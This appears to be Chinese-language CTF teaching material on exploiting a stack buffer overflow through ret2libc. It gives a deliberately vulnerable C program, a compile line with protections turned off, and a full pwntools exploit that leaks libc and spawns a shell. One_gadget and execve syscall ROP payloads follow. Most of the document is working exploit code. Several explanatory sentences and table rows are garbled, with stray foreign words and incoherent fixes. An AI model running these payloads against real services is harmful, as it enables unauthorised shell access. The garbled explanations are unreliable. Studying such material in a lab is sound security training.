# P4 · 棧溢出與 ret2libc（40 分鐘 · 核心）

> 這是 Pwn 模組的核心：把「找 offset → leak libc → ret2libc 反彈 shell」三步全流程做一遍。
> 期末驗收就是這個：**改一份 libc，必須 5 分鐘內改好並通**。

---

## 1 · 問題模型

```c
// challenge.c
#include <stdio.h>
void vuln() {
    char buf[64];
    puts("Enter your name: ");
    read(0, buf, 0x100);              // buffer 過小、read 太大 → overflow
    puts("Bye");
}
int main(){ setvbuf(stdout,NULL,_IONBF,0); setvbuf(stdin,NULL,_IONBF,0); vuln(); }
```

編譯式（本地環境全關保護，便於第一輪學習）：

```bash
gcc -fno-stack-protector -no-pie -z norelro challenge.c -o challenge
```

**流程心法**：

```text
① 確認 overflow 存在與 offset   （用 cyclic 定位 ret addr 位置）
② 用「已有函數」造 ROP → leak libc
③ 用 leak 反推 libc base → 再拼一次 ROP → 跳 system("/bin/sh")
```

> 重點：**兩輪 ROP**。第一輪是「送 key 到手上」，第二輪是「把 key 插到鎖上」。

---

## 2 · 第一階段：定位 offset 並 leak libc

### 2.1 造 payload 的「兩件事」

```text
① 誰會被覆蓋？  → ret 位址（與 buf 的 offset）
② 誰需要 leak？  →  libc 中某個 known symbol 的真實位址
```

> 不 leak libc 的模組其實「吃 gdb info」——但賽場 binary 的 libc 未必與本地共有。
> 賽場**只須兩步：拿 leak → 查 libc**。

### 2.2 第一輪 ROP（利用已有的 puts to leak）

```python
# 先找出「pop rdi ; ret」的 gadget 地址
$ ROPgadget --binary ./challenge --only "pop|ret"
0x4012ab : pop rdi ; ret
```

**payload**：

```python
pay = flat(b'A'*72,            # 64 buf + 8 saved rbp （ eid buffer=64; offbit 省上）
           pop_rdi,            # gadget: 把 next 項放進 rdi
           elf.got['puts'],    # 下一個 stack 是 pop rdi 的來源
           elf.plt['puts'],    # 呼叫 puts(<got puts>) → 輸出 puts 真實位址
           elf.symbols['main'])# 回到 main，重新執行，從而成為第二輪
io.sendlineafter(b'name: ', pay)
leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
```

> **`ljust(8,b'\x00')` 是 u64 的常用技巧**——puts 輸出的是地址的 6 個有效 bytes (大的 memory 地址高位是 0)，得到 crash 為容容驗。
>
> 本例 `leak` 是 **遠端 libc 的 `puts` 真實位址**。

### 2.3 計算 libc base

```python
libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh'))
log.success(f'libc base = {libc.address:#x}, system = {system:#x}')
```

> **前提**：本地提供的 `libc.so.6` 必須與遠端相同。賽場常見有兩種：
> - 附件給 `libc.so.6` → 修改 `libc = ELF('./libc.so.6')`
> - 賽場 page 或 describe 給 libc 版本（Ubuntu 20.04 / 22.04）→ 本地用對應版本

---

## 3 · 第二階段：ret2libc 反彈 shell

### 3.1 payload

```python
payload = flat(b'A'*72,
               pop_rdi,
               binsh,                     # /bin/sh 的真实地址
               0x401234,                  # (可選) ret gadget：16 位元對齊
               system,
               0)                         # system 的 潤步/arg
io.sendlineafter(b'name:', payload)
io.interactive()
```

> **16-byte stack alignment**：`system()` 内部有 `movaps`，若棧不是 16-byte 對齊，**直接 SEGV**。
> 修法：**在中間多放一個 `ret` gadget**，使國際 addr usuário 位置 +8。

### 3.2 一個完整的 exploit（賽場版；本地測）

```python
#!/usr/bin/env python3
from pwn import *
context.arch='amd64'
context.log_level='info'

elf  = ELF('./challenge')
libc = ELF('./libc.so.6', checksec=False)
POP_RDI = 0x4012ab     # ROPgadget --binary ./challenge --only "pop|ret"
RET     = 0x40101a

def start():
    return remote('x.x.x.x', 9999) if args.REMOTE else process('./challenge')
io = start()

# 第一輪
io.sendlineafter(b'name: ', flat(b'A'*72, POP_RDI, elf.got['puts'], elf.plt['puts'], elf.symbols['main']))
leak = u64(io.recvline()[: -1].ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.info(f'libc: {libc.address:#x}')

# 第二輪
io.sendlineafter(b'name: ', flat(b'A'*72, POP_RDI, next(libc.search(b'/bin/sh')), RET, libc.symbols['system'], 0))
io.interactive()
```

---

## 4 · 避免 5 大常見失誤

| # | 失誤 | 修法 |
|---|---|---|
| 1 | offset 估算錯 | 用 `cyclic` BUF+-8 之別 |
| 2 | gadget 不是 `pop rdi; ret`   | 找 `pop rdi; pop rbx; ret` 整項各需要 |
| 3 | `%p` 沒對齊 16-byte | 補一個 ret gadget |
| 4 | 沒收 `puts` 的 **换行**，leak 錯 | `recvline` 常得 asad or fixture |
| 5 | wrong libc | 種 `libc6-dbg` 或 pwntools 未知時 — `ldd` |

---

## 5 · 附加（進階兩跳）

### 5.1 one_gadget

```bash
one_gadget ./libc.so.6
0xe3b2e  execve("/bin/sh", rsp+0x50, environ)
  constraints: rsp & 0xf == 0
```

```python
pay = flat(b'A'*72, ONE_GADGET)
```

> 一個 limb 拿 shell 更快；但 **有 constraints**（例如需要 `rsp+X == NULL`）。

### 5.2 syscall ROP（無 libc 情境）

```python
# execve("/bin/sh", NULL, NULL)
pop_rax = 0x4011a3; pop_rdi = 0x4012ab; pop_rsi = 0x4012ad; pop_rdx = 0x40121d
pay = flat(b'A'*72,
  pop_rax, 59,
  pop_rdi, next(elf.search(b'/bin/sh')),
  pop_rsi, 0, pop_rdx, 0,
  syscall_gadget)
```

> 需要binary有 `syscall` gadget（常常）和所有霧變щиков gadget 匿名；PLT 呼叫較簡單。

### 5.3 ret2csu / ret2dl (課堂不做)

若被 pin-source 的 code to `$%$` (純格式字串雙以，無 libc 預被提供)，需要 `ret2dl_resolve`；
課堂請只記名稱與用途（詳請見 ctf 例子）。

---

## 6 · 課堂練習（下 20 分鐘全部給學員）

> 練習 31/32/33:
> * 31: ret2libc (buffer 64, no pie, 無 canary)
> * 32: ret2libc + 16-byte 對齊（改進題 31 中的)。
> * 33: `one_gadget`（61% 版本）

> 完成後收：**讓學員在 3 分鐘內，然後把 libc.so.6 改成另一套，改出偏移，再通**。

## 7 · 講師提示

- 課堂 demo 把 **本地 attacker 与遠端`args.REMOTE`** 的 switch 一次用上演示。
- 將「`u64` + `ljust`」寫成一個常備 `helper` 函數放在  `05-模板/`。
